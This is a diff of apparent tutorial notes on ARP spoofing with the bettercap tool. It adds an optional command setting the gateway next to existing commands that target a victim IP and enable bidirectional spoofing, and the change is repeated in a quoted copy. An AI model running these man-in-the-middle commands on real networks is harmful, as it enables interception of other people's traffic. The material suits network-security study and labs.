@@ -67,6 +67,9 @@ net.recon (not running): Read periodically the ARP cache in order to monitor for
 * Target a victim
 10.0.2.0/24 > 10.0.2.5 » set arp.spoof.targets <victim IP>
 
+* [ optional ] Give the gateway
+10.0.2.0/24 > 10.0.2.5 » set arp.spoof.gateway <gateway IP>
+
 * How to make a bidirectional ARP spoofing.
 10.0.2.0/24 > 10.0.2.5 » help arp.spoof
 10.0.2.0/24 > 10.0.2.5 » set arp.spoof.fullduplex true
@@ -156,6 +159,9 @@ net.recon (not running): Read periodically the ARP cache in order to monitor for
 >@
 >@* Target a victim
 >@10.0.2.0/24 > 10.0.2.5 » set arp.spoof.targets <victim IP>
+>@
+>@* [ optional ] Give the gateway
+>@10.0.2.0/24 > 10.0.2.5 » set arp.spoof.gateway <gateway IP>
 >@
 >@* How to make a bidirectional ARP spoofing.
 >@10.0.2.0/24 > 10.0.2.5 » help arp.spoof
